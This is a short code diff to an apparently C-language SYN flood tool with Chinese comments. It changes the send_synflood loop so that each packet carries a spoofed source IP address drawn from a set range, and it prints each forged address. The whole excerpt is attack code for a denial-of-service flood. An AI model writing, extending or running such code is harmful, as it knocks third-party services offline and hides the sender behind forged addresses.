@@ -66,6 +66,11 @@ struct pseudohdr {
 	unsigned short length;
 };
 
+inline long myrandom(int begin, int end) {
+	srand(clock());
+	return rand() % (end - begin) + begin;
+}
+
 /* CRC16校验 */
 unsigned short inline checksum(unsigned short *buffer, unsigned short size) {
 
@@ -145,8 +150,10 @@ send_synflood(void *addr) {
 
 	/* 处于活动状态时持续发送SYN包 */
 	while (alive) {
-		ip.sourceIP = rand();
-
+		ip.sourceIP = htonl(myrandom(0xcc000000, 0xcccccccc));
+		struct in_addr add;
+		add.s_addr = ip.sourceIP;
+		printf("source addr is %s\n", inet_ntoa(add));
 		//计算IP校验和
 		bzero(buf, sizeof(buf));
 		memcpy(buf, &ip, sizeof(struct ip));
